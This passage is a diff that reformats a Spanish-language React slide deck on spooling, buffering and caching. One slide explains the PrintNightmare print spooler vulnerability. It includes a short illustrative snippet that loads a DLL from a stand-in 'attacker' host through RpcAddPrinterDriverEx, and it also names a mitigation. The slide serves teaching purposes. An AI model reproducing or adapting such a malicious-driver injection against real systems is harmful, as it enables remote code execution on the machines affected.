+                    </p>
                   </div>
-                  <div className="metric-card" style={{ borderLeft: "4px solid var(--accent-cache)" }}>
-                    <h4 style={{ fontSize: "1.8rem", color: "var(--fg)", marginBottom: "0.5rem" }}>3. Tolerancia a Fallos</h4>
-                    <p style={{ fontSize: "1.5rem !important", margin: 0, opacity: 0.8 }}>Los datos residen en disco no volátil. Permite reanudar impresiones tras un corte de energía (a diferencia del buffering).</p>
+                  <div
+                    className="metric-card"
+                    style={{ borderLeft: "4px solid var(--accent-cache)" }}
+                  >
+                    <h4
+                      style={{
+                        fontSize: "1.8rem",
+                        color: "var(--fg)",
+                        marginBottom: "0.5rem",
+                      }}
+                    >
+                      3. Tolerancia a Fallos
+                    </h4>
+                    <p
+                      style={{
+                        fontSize: "1.5rem !important",
+                        margin: 0,
+                        opacity: 0.8,
+                      }}
+                    >
+                      Los datos residen en disco no volátil. Permite reanudar
+                      impresiones tras un corte de energía (a diferencia del
+                      buffering).
+                    </p>
                   </div>
                 </div>
                 <div className="glass-card" style={{ padding: "3rem" }}>
-                  <h4 style={{ fontSize: "2.2rem", color: "var(--accent-gold)", marginBottom: "1.5rem" }}>Abstracción de Formatos</h4>
-                  <p style={{ fontSize: "1.8rem !important", lineHeight: 1.5 }}>El motor GDI realiza spooling de instrucciones como archivos EMF, procesados por drivers específicos (PCL, PostScript).</p>
+                  <h4
+                    style={{
+                      fontSize: "2.2rem",
+                      color: "var(--accent-gold)",
+                      marginBottom: "1.5rem",
+                    }}
+                  >
+                    Abstracción de Formatos
+                  </h4>
+                  <p style={{ fontSize: "1.8rem !important", lineHeight: 1.5 }}>
+                    El motor GDI realiza spooling de instrucciones como archivos
+                    EMF, procesados por drivers específicos (PCL, PostScript).
+                  </p>
                   <div className="technical-note" style={{ marginTop: "2rem" }}>
-                    <strong style={{ color: "var(--accent-buf)" }}>Ruta XPS Moderna:</strong> Pasa archivos directamente al dispositivo, eliminando conversiones intermedias y reduciendo latencia.
+                    <strong style={{ color: "var(--accent-buf)" }}>
+                      Ruta XPS Moderna:
+                    </strong>{" "}
+                    Pasa archivos directamente al dispositivo, eliminando
+                    conversiones intermedias y reduciendo latencia.
                   </div>
                 </div>
               </div>
@@ -1146,203 +1688,244 @@ export default function App() {
                 justifyContent: "center",
               }}
             >
-            <div
-              className="grid-2"
-              style={{
-                gap: "6rem",
-                alignItems: "center",
-                maxWidth: "1800px",
-                margin: "0 auto",
-              }}
-            >
               <div
+                className="grid-2"
                 style={{
-                  textAlign: "left",
-                  display: "flex",
-                  flexDirection: "column",
-                  gap: "2.5rem",
-                  width: "100%",
+                  gap: "6rem",
+                  alignItems: "center",
+                  maxWidth: "1800px",
+                  margin: "0 auto",
                 }}
               >
-                <div>
-                  <span
-                    className="presenter-tag"
-                    style={{
-                      background: "rgba(203, 124, 148, 0.1)",
-                      color: "var(--accent-red)",
-                      borderColor: "rgba(203, 124, 148, 0.3)",
-                      marginBottom: "1.5rem",
-                    }}
-                  >
-                    AUDITORÍA // CVE-2021-34527
-                  </span>
-                  <h2
-                    style={{
-                      fontSize: "6rem",
-                      margin: 0,
-                      lineHeight: "1",
-                      letterSpacing: "-0.02em",
-                    }}
-                  >
-                    PrintNightmare
-                  </h2>
-                </div>
-
                 <div
-                  className="glass-card"
                   style={{
-                    borderColor: "rgba(203, 124, 148, 0.3)",
-                    padding: "3.5rem",
-                    position: "relative",
-                    overflow: "hidden",
+                    textAlign: "left",
+                    display: "flex",
+                    flexDirection: "column",
+                    gap: "2.5rem",
+                    width: "100%",
                   }}
                 >
+                  <div>
+                    <span
+                      className="presenter-tag"
+                      style={{
+                        background: "rgba(203, 124, 148, 0.1)",
+                        color: "var(--accent-red)",
+                        borderColor: "rgba(203, 124, 148, 0.3)",
+                        marginBottom: "1.5rem",
+                      }}
+                    >
+                      AUDITORÍA // CVE-2021-34527
+                    </span>
+                    <h2
+                      style={{
+                        fontSize: "6rem",
+                        margin: 0,
+                        lineHeight: "1",
+                        letterSpacing: "-0.02em",
+                      }}
+                    >
+                      PrintNightmare
+                    </h2>
+                  </div>
+
+                  <div
+                    className="glass-card"
+                    style={{
+                      borderColor: "rgba(203, 124, 148, 0.3)",
+                      padding: "3.5rem",
+                      position: "relative",
+                      overflow: "hidden",
+                    }}
+                  >
+                    <div
+                      style={{
+                        position: "absolute",
+                        top: "-20px",
+                        right: "-20px",
+                        opacity: 0.05,
+                        pointerEvents: "none",
+                      }}
+                    >
+                      <ShieldAlert size={250} color="var(--accent-red)" />
+                    </div>
+                    <p
+                      style={{
+                        fontSize: "2.5rem !important",
+                        color: "var(--fg)",
+                        lineHeight: "1.4",
+                        margin: 0,
+                        position: "relative",
+                        zIndex: 1,
+                      }}
+                    >
+                      Los servicios de Spooler legados permitieron la{" "}
+                      <strong>Ejecución Remota de Código</strong> mediante la
+                      inyección de DLLs arbitrarias. Según Walters (2025), la
+                      postura de seguridad ha mejorado eliminando ejecuciones
+                      remotas de código.
+                    </p>
+                    <div
+                      style={{
+                        marginTop: "2rem",
+                        display: "grid",
+                        gridTemplateColumns: "1fr 1fr",
+                        gap: "1rem",
+                      }}
+                    >
+                      <div
+                        className="metric-card"
+                        style={{ textAlign: "center" }}
+                      >
+                        <div
+                          className="metric-val"
+                          style={{ color: "var(--accent-red)" }}
+                        >
+                          35
+                        </div>
+                        <div className="metric-label">
+                          Vulnerabilidades en 2022
+                        </div>
+                      </div>
+                      <div
+                        className="metric-card"
+                        style={{ textAlign: "center" }}
+                      >
+                        <div
+                          className="metric-val"
+                          style={{ color: "var(--accent-cache)" }}
+                        >
+                          0
+                        </div>
+                        <div className="metric-label">RCEs desde 2021</div>
+                      </div>
+                    </div>
+                  </div>
+
                   <div
                     style={{
-                      position: "absolute",
-                      top: "-20px",
-                      right: "-20px",
-                      opacity: 0.05,
-                      pointerEvents: "none",
+                      display: "flex",
+                      alignItems: "center",
+                      gap: "1.5rem",
+                      color: "var(--accent-red)",
+                      background: "rgba(203, 124, 148, 0.1)",
+                      padding: "2rem",
+                      borderRadius: "20px",
+                      border: "1px solid rgba(203, 124, 148, 0.2)",
                     }}
                   >
-                    <ShieldAlert size={250} color="var(--accent-red)" />
-                  </div>
-                  <p
-                    style={{
-                      fontSize: "2.5rem !important",
-                      color: "var(--fg)",
-                      lineHeight: "1.4",
-                      margin: 0,
-                      position: "relative",
-                      zIndex: 1,
-                    }}
-                  >
-                    Los servicios de Spooler legados permitieron la{" "}
-                    <strong>Ejecución Remota de Código</strong> mediante la
-                    inyección de DLLs arbitrarias. Según Walters (2025), la postura de seguridad ha mejorado eliminando ejecuciones remotas de código.
-                  </p>
-                  <div style={{ marginTop: "2rem", display: "grid", gridTemplateColumns: "1fr 1fr", gap: "1rem" }}>
-                    <div className="metric-card" style={{ textAlign: "center" }}>
-                      <div className="metric-val" style={{ color: "var(--accent-red)" }}>35</div>
-                      <div className="metric-label">Vulnerabilidades en 2022</div>
-                    </div>
-                    <div className="metric-card" style={{ textAlign: "center" }}>
-                      <div className="metric-val" style={{ color: "var(--accent-cache)" }}>0</div>
-                      <div className="metric-label">RCEs desde 2021</div>
-                    </div>
+                    <ShieldAlert size={40} />
+                    <span
+                      style={{
+                        fontWeight: 800,
+                        fontSize: "2rem",
+                        letterSpacing: "0.05em",
+                      }}
+                    >
+                      FALLO CRÍTICO DE ARQUITECTURA
+                    </span>
                   </div>
                 </div>
 
                 <div
                   style={{
                     display: "flex",
-                    alignItems: "center",
-                    gap: "1.5rem",
-                    color: "var(--accent-red)",
-                    background: "rgba(203, 124, 148, 0.1)",
-                    padding: "2rem",
-                    borderRadius: "20px",
-                    border: "1px solid rgba(203, 124, 148, 0.2)",
+                    flexDirection: "column",
+                    gap: "3rem",
+                    width: "100%",
                   }}
                 >
-                  <ShieldAlert size={40} />
-                  <span
+                  <div
                     style={{
-                      fontWeight: 800,
-                      fontSize: "2rem",
-                      letterSpacing: "0.05em",
+                      borderRadius: "24px",
+                      overflow: "hidden",
+                      boxShadow: "0 50px 100px rgba(0,0,0,0.7)",
+                      border: "1px solid var(--line)",
                     }}
                   >
-                    FALLO CRÍTICO DE ARQUITECTURA
-                  </span>
-                </div>
-              </div>
-
-              <div
-                style={{
-                  display: "flex",
-                  flexDirection: "column",
-                  gap: "3rem",
-                  width: "100%",
-                }}
-              >
-                <div
-                  style={{
-                    borderRadius: "24px",
-                    overflow: "hidden",
-                    boxShadow: "0 50px 100px rgba(0,0,0,0.7)",
-                    border: "1px solid var(--line)",
-                  }}
-                >
-                  <Code
-                    language="javascript"
-                    lineNumbers="1|3-5|7"
-                    style={{
-                      fontSize: "1.7rem",
-                      padding: "2.5rem",
-                      margin: 0,
-                    }}
-                  >
-                    {`// Ataque RpcAddPrinterDriverEx
+                    <Code
+                      language="javascript"
+                      lineNumbers="1|3-5|7"
+                      style={{
+                        fontSize: "1.7rem",
+                        padding: "2.5rem",
+                        margin: 0,
+                      }}
+                    >
+                      {`// Ataque RpcAddPrinterDriverEx
 const evilDLL = "\\\\\\\\attacker\\\\exploit.dll";
 
 // Inyección en el Spooler persistente
 installDriver(evilDLL); 
 
 // Resultado: Compromiso Total`}
-                  </Code>
-                </div>
+                    </Code>
+                  </div>
 
-                <motion.div
-                  initial={{ opacity: 0, scale: 0.95 }}
-                  whileInView={{ opacity: 1, scale: 1 }}
-                  className="technical-note"
-                  style={{
-                    margin: 0,
-                    borderColor: "var(--accent-red)",
-                    background: "rgba(255, 255, 255, 0.03)",
-                    padding: "2.5rem",
-                    borderRadius: "24px",
-                    borderLeftWidth: "12px",
-                  }}
-                >
-                  <h4
+                  <motion.div
+                    initial={{ opacity: 0, scale: 0.95 }}
+                    whileInView={{ opacity: 1, scale: 1 }}
+                    className="technical-note"
                     style={{
-                      fontSize: "2.2rem !important",
-                      color: "var(--fg)",
-                      marginBottom: "1rem",
-                      display: "flex",
-                      alignItems: "center",
-                      gap: "1rem",
-                    }}
-                  >
-                    <ArrowRight color="var(--accent-red)" /> Mitigación
-                  </h4>
-                  <p
-                    style={{
-                      fontSize: "2rem !important",
                       margin: 0,
-                      lineHeight: "1.4",
+                      borderColor: "var(--accent-red)",
+                      background: "rgba(255, 255, 255, 0.03)",
+                      padding: "2.5rem",
+                      borderRadius: "24px",
+                      borderLeftWidth: "12px",
                     }}
                   >
-                    Aislamiento de procesos y <strong>Sandboxing</strong> de
-                    colas de impresión.
-                  </p>
-                </motion.div>
+                    <h4
+                      style={{
+                        fontSize: "2.2rem !important",
+                        color: "var(--fg)",
+                        marginBottom: "1rem",
+                        display: "flex",
+                        alignItems: "center",
+                        gap: "1rem",
+                      }}
+                    >
+                      <ArrowRight color="var(--accent-red)" /> Mitigación
+                    </h4>
+                    <p
+                      style={{
+                        fontSize: "2rem !important",
+                        margin: 0,
+                        lineHeight: "1.4",
+                      }}
+                    >
+                      Aislamiento de procesos y <strong>Sandboxing</strong> de
+                      colas de impresión.
+                    </p>
+                  </motion.div>
+                </div>
               </div>
             </div>
-          </div>
-        </Slide>
+          </Slide>
         </Stack>
 
         {/* ── [NUEVO] SISTEMAS DISTRIBUIDOS: BUFFERING ── */}
         <Slide data-transition="zoom">
           <div style={{ padding: "0 8%", textAlign: "left" }}>
-            <div style={{ display: "flex", alignItems: "center", gap: "2rem", marginBottom: "3rem" }}>
+            <div
+              style={{
+                display: "flex",
+                alignItems: "center",
+                gap: "2rem",
+                marginBottom: "3rem",
+              }}
+            >
               <Network size={55} color="var(--accent-buf)" />
               <div>
-                <span style={{ fontFamily: "var(--mono)", fontSize: "1.1rem", color: "var(--accent-buf)", letterSpacing: "0.2em" }}>
+                <span
+                  style={{
+                    fontFamily: "var(--mono)",
+                    fontSize: "1.1rem",
+                    color: "var(--accent-buf)",
+                    letterSpacing: "0.2em",
+                  }}
+                >
                   SISTEMAS DISTRIBUIDOS
                 </span>
                 <h2 style={{ fontSize: "4.5rem", margin: 0 }}>
@@ -1352,44 +1935,109 @@ installDriver(evilDLL);
             </div>
 
             <div className="grid-2" style={{ gap: "4rem" }}>
-              <div style={{ display: "flex", flexDirection: "column", gap: "2rem" }}>
-                <div className="metric-card" style={{ borderLeft: "4px solid var(--accent-buf)" }}>
-                  <h4 style={{ color: "var(--accent-buf)", fontSize: "2rem", marginBottom: "0.8rem" }}>
+              <div
+                style={{
+                  display: "flex",
+                  flexDirection: "column",
+                  gap: "2rem",
+                }}
+              >
+                <div
+                  className="metric-card"
+                  style={{ borderLeft: "4px solid var(--accent-buf)" }}
+                >
+                  <h4
+                    style={{
+                      color: "var(--accent-buf)",
+                      fontSize: "2rem",
+                      marginBottom: "0.8rem",
+                    }}
+                  >
                     Apache Kafka — Log de Eventos
                   </h4>
                   <p style={{ fontSize: "1.6rem !important", margin: 0 }}>
-                    Kafka actúa como un <strong>buffer distribuido persistente</strong>. Los productores escriben a particiones (disco) sin esperar a los consumidores. Desacopla microservicios que operan a velocidades distintas — el mismo principio del spooling, pero a escala de clúster.
+                    Kafka actúa como un{" "}
+                    <strong>buffer distribuido persistente</strong>. Los
+                    productores escriben a particiones (disco) sin esperar a los
+                    consumidores. Desacopla microservicios que operan a
+                    velocidades distintas — el mismo principio del spooling,
+                    pero a escala de clúster.
                   </p>
                 </div>
-                <div className="metric-card" style={{ borderLeft: "4px solid var(--accent-gold)" }}>
-                  <h4 style={{ color: "var(--accent-gold)", fontSize: "2rem", marginBottom: "0.8rem" }}>
+                <div
+                  className="metric-card"
+                  style={{ borderLeft: "4px solid var(--accent-gold)" }}
+                >
+                  <h4
+                    style={{
+                      color: "var(--accent-gold)",
+                      fontSize: "2rem",
+                      marginBottom: "0.8rem",
+                    }}
+                  >
                     TCP Receive/Send Buffers
                   </h4>
                   <p style={{ fontSize: "1.6rem !important", margin: 0 }}>
-                    El kernel mantiene buffers de envío y recepción por socket. El <strong>control de flujo</strong> (ventana deslizante) es buffer management distribuido: el receptor anuncia cuánto espacio tiene, previniendo overflow entre nodos remotos.
+                    El kernel mantiene buffers de envío y recepción por socket.
+                    El <strong>control de flujo</strong> (ventana deslizante) es
+                    buffer management distribuido: el receptor anuncia cuánto
+                    espacio tiene, previniendo overflow entre nodos remotos.
                   </p>
                 </div>
               </div>
 
               <div className="glass-card" style={{ padding: "3rem" }}>
-                <h4 style={{ fontSize: "2.2rem", color: "var(--accent-spool)", marginBottom: "2rem" }}>
+                <h4
+                  style={{
+                    fontSize: "2.2rem",
+                    color: "var(--accent-spool)",
+                    marginBottom: "2rem",
+                  }}
+                >
                   RabbitMQ — Message Queuing
                 </h4>
-                <p style={{ fontSize: "1.8rem !important", lineHeight: 1.5, marginBottom: "2rem" }}>
-                  Patrón <strong>productor-consumidor distribuido</strong>: los mensajes se bufferean en colas persistentes. Si el consumidor cae, los mensajes sobreviven — análogo al spooling en disco local.
+                <p
+                  style={{
+                    fontSize: "1.8rem !important",
+                    lineHeight: 1.5,
+                    marginBottom: "2rem",
+                  }}
+                >
+                  Patrón <strong>productor-consumidor distribuido</strong>: los
+                  mensajes se bufferean en colas persistentes. Si el consumidor
+                  cae, los mensajes sobreviven — análogo al spooling en disco
+                  local.
                 </p>
-                <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "1rem" }}>
+                <div
+                  style={{
+                    display: "grid",
+                    gridTemplateColumns: "1fr 1fr",
+                    gap: "1rem",
+                  }}
+                >
                   <div className="metric-card" style={{ textAlign: "center" }}>
-                    <div className="metric-val" style={{ color: "var(--accent-buf)" }}>ACK</div>
+                    <div
+                      className="metric-val"
+                      style={{ color: "var(--accent-buf)" }}
+                    >
+                      ACK
+                    </div>
                     <div className="metric-label">Confirmación explícita</div>
                   </div>
                   <div className="metric-card" style={{ textAlign: "center" }}>
-                    <div className="metric-val" style={{ color: "var(--accent-cache)" }}>DLQ</div>
+                    <div
+                      className="metric-val"
+                      style={{ color: "var(--accent-cache)" }}
+                    >
+                      DLQ
+                    </div>
                     <div className="metric-label">Dead Letter Queue</div>
                   </div>
                 </div>
                 <div className="technical-note" style={{ marginTop: "1.5rem" }}>
-                  <strong>Analogía clave:</strong> Kafka/RabbitMQ = Spooling distribuido. Buffer local en RAM = Buffering clásico. La arquitectura es la misma; el medio es la red.
+                  <strong>Analogía clave:</strong> Kafka/RabbitMQ = Spooling
+                  distribuido. Buffer local en RAM = Buffering clásico. La
+                  arquitectura es la misma; el medio es la red.
                 </div>
               </div>
             </div>
@@ -1398,11 +2046,34 @@ installDriver(evilDLL);
 
         {/* ── [NUEVO] SISTEMAS DISTRIBUIDOS: CACHING ── */}
         <Slide data-transition="zoom">
-          <div style={{ padding: "0 5%", textAlign: "left", height: "100%", display: "flex", flexDirection: "column", justifyContent: "center" }}>
-            <div style={{ display: "flex", alignItems: "center", gap: "2rem", marginBottom: "2rem" }}>
+          <div
+            style={{
+              padding: "0 5%",
+              textAlign: "left",
+              height: "100%",
+              display: "flex",
+              flexDirection: "column",
+              justifyContent: "center",
+            }}
+          >
+            <div
+              style={{
+                display: "flex",
+                alignItems: "center",
+                gap: "2rem",
+                marginBottom: "2rem",
+              }}
+            >
               <Globe size={55} color="var(--accent-cache)" />
               <div>
-                <span style={{ fontFamily: "var(--mono)", fontSize: "1.1rem", color: "var(--accent-cache)", letterSpacing: "0.2em" }}>
+                <span
+                  style={{
+                    fontFamily: "var(--mono)",
+                    fontSize: "1.1rem",
+                    color: "var(--accent-cache)",
+                    letterSpacing: "0.2em",
+                  }}
+                >
                   SISTEMAS DISTRIBUIDOS
                 </span>
                 <h2 style={{ fontSize: "4.5rem", margin: 0 }}>
@@ -1411,42 +2082,183 @@ installDriver(evilDLL);
               </div>
             </div>
 
-            <div style={{ display: "grid", gridTemplateColumns: "repeat(3, 1fr)", gap: "1rem", alignItems: "stretch", width: "100%", boxSizing: "border-box" }}>
-              <div className="glass-card" style={{ padding: "1.5rem", borderTop: "6px solid var(--accent-buf)", display: "flex", flexDirection: "column", height: "100%", minWidth: 0, boxSizing: "border-box" }}>
-                <div style={{ display: "flex", alignItems: "center", gap: "0.8rem", marginBottom: "1rem" }}>
+            <div
+              style={{
+                display: "grid",
+                gridTemplateColumns: "repeat(3, 1fr)",
+                gap: "1rem",
+                alignItems: "stretch",
+                width: "100%",
+                boxSizing: "border-box",
+              }}
+            >
+              <div
+                className="glass-card"
+                style={{
+                  padding: "1.5rem",
+                  borderTop: "6px solid var(--accent-buf)",
+                  display: "flex",
+                  flexDirection: "column",
+                  height: "100%",
+                  minWidth: 0,
+                  boxSizing: "border-box",
+                }}
+              >
+                <div
+                  style={{
+                    display: "flex",
+                    alignItems: "center",
+                    gap: "0.8rem",
+                    marginBottom: "1rem",
+                  }}
+                >
                   <Server size={24} color="var(--accent-buf)" />
-                  <h3 style={{ fontSize: "1.6rem", margin: 0, color: "var(--accent-buf)" }}>Redis</h3>
+                  <h3
+                    style={{
+                      fontSize: "1.6rem",
+                      margin: 0,
+                      color: "var(--accent-buf)",
+                    }}
+                  >
+                    Redis
+                  </h3>
                 </div>
-                <p style={{ fontSize: "1.2rem !important", margin: "0 0 1rem 0", flexGrow: 1, overflowWrap: "anywhere" }}>
-                  <strong>Caché en memoria</strong> distribuida con estructuras de datos ricas. Soporta replicación.
+                <p
+                  style={{
+                    fontSize: "1.2rem !important",
+                    margin: "0 0 1rem 0",
+                    flexGrow: 1,
+                    overflowWrap: "anywhere",
+                  }}
+                >
+                  <strong>Caché en memoria</strong> distribuida con estructuras
+                  de datos ricas. Soporta replicación.
                 </p>
-                <div style={{ fontFamily: "var(--mono)", fontSize: "0.9rem", color: "var(--accent-buf)", opacity: 0.7, background: "rgba(255,255,255,0.03)", padding: "0.5rem", borderRadius: "8px" }}>
+                <div
+                  style={{
+                    fontFamily: "var(--mono)",
+                    fontSize: "0.9rem",
+                    color: "var(--accent-buf)",
+                    opacity: 0.7,
+                    background: "rgba(255,255,255,0.03)",
+                    padding: "0.5rem",
+                    borderRadius: "8px",
+                  }}
+                >
                   Latencia: ~0.1 ms
                 </div>
               </div>
 
-              <div className="glass-card" style={{ padding: "1.5rem", borderTop: "6px solid var(--accent-gold)", display: "flex", flexDirection: "column", height: "100%", minWidth: 0, boxSizing: "border-box" }}>
-                <div style={{ display: "flex", alignItems: "center", gap: "0.8rem", marginBottom: "1rem" }}>
+              <div
+                className="glass-card"
+                style={{
+                  padding: "1.5rem",
+                  borderTop: "6px solid var(--accent-gold)",
+                  display: "flex",
+                  flexDirection: "column",
+                  height: "100%",
+                  minWidth: 0,
+                  boxSizing: "border-box",
+                }}
+              >
+                <div
+                  style={{
+                    display: "flex",
+                    alignItems: "center",
+                    gap: "0.8rem",
+                    marginBottom: "1rem",
+                  }}
+                >
                   <Globe size={24} color="var(--accent-gold)" />
-                  <h3 style={{ fontSize: "1.6rem", margin: 0, color: "var(--accent-gold)" }}>CDN</h3>
+                  <h3
+                    style={{
+                      fontSize: "1.6rem",
+                      margin: 0,
+                      color: "var(--accent-gold)",
+                    }}
+                  >
+                    CDN
+                  </h3>
                 </div>
-                <p style={{ fontSize: "1.2rem !important", margin: "0 0 1rem 0", flexGrow: 1, overflowWrap: "anywhere" }}>
-                  <strong>Distribución global</strong>: PoPs que reducen latencia de ~200 ms a ~5 ms.
+                <p
+                  style={{
+                    fontSize: "1.2rem !important",
+                    margin: "0 0 1rem 0",
+                    flexGrow: 1,
+                    overflowWrap: "anywhere",
+                  }}
+                >
+                  <strong>Distribución global</strong>: PoPs que reducen
+                  latencia de ~200 ms a ~5 ms.
                 </p>
-                <div style={{ fontFamily: "var(--mono)", fontSize: "0.9rem", color: "var(--accent-gold)", opacity: 0.7, background: "rgba(255,255,255,0.03)", padding: "0.5rem", borderRadius: "8px" }}>
+                <div
+                  style={{
+                    fontFamily: "var(--mono)",
+                    fontSize: "0.9rem",
+                    color: "var(--accent-gold)",
+                    opacity: 0.7,
+                    background: "rgba(255,255,255,0.03)",
+                    padding: "0.5rem",
+                    borderRadius: "8px",
+                  }}
+                >
                   Cache-Control / ETag
                 </div>
               </div>
 
-              <div className="glass-card" style={{ padding: "1.5rem", borderTop: "6px solid var(--accent-cache)", display: "flex", flexDirection: "column", height: "100%", minWidth: 0, boxSizing: "border-box" }}>
-                <div style={{ display: "flex", alignItems: "center", gap: "0.8rem", marginBottom: "1rem" }}>
+              <div
+                className="glass-card"
+                style={{
+                  padding: "1.5rem",
+                  borderTop: "6px solid var(--accent-cache)",
+                  display: "flex",
+                  flexDirection: "column",
+                  height: "100%",
+                  minWidth: 0,
+                  boxSizing: "border-box",
+                }}
+              >
+                <div
+                  style={{
+                    display: "flex",
+                    alignItems: "center",
+                    gap: "0.8rem",
+                    marginBottom: "1rem",
+                  }}
+                >
                   <Database size={24} color="var(--accent-cache)" />
-                  <h3 style={{ fontSize: "1.6rem", margin: 0, color: "var(--accent-cache)" }}>Memcached</h3>
+                  <h3
+                    style={{
+                      fontSize: "1.6rem",
+                      margin: 0,
+                      color: "var(--accent-cache)",
+                    }}
+                  >
+                    Memcached
+                  </h3>
                 </div>
-                <p style={{ fontSize: "1.2rem !important", margin: "0 0 1rem 0", flexGrow: 1, overflowWrap: "anywhere" }}>
-                  <strong>Clave-valor</strong> de alta velocidad. Sin persistencia. Reduce carga en DB relacionales.
+                <p
+                  style={{
+                    fontSize: "1.2rem !important",
+                    margin: "0 0 1rem 0",
+                    flexGrow: 1,
+                    overflowWrap: "anywhere",
+                  }}
+                >
+                  <strong>Clave-valor</strong> de alta velocidad. Sin
+                  persistencia. Reduce carga en DB relacionales.
                 </p>
-                <div style={{ fontFamily: "var(--mono)", fontSize: "0.9rem", color: "var(--accent-cache)", opacity: 0.7, background: "rgba(255,255,255,0.03)", padding: "0.5rem", borderRadius: "8px" }}>
+                <div
+                  style={{
+                    fontFamily: "var(--mono)",
+                    fontSize: "0.9rem",
+                    color: "var(--accent-cache)",
+                    opacity: 0.7,
+                    background: "rgba(255,255,255,0.03)",
+                    padding: "0.5rem",
+                    borderRadius: "8px",
+                  }}
+                >
                   Consistent Hashing
                 </div>
               </div>
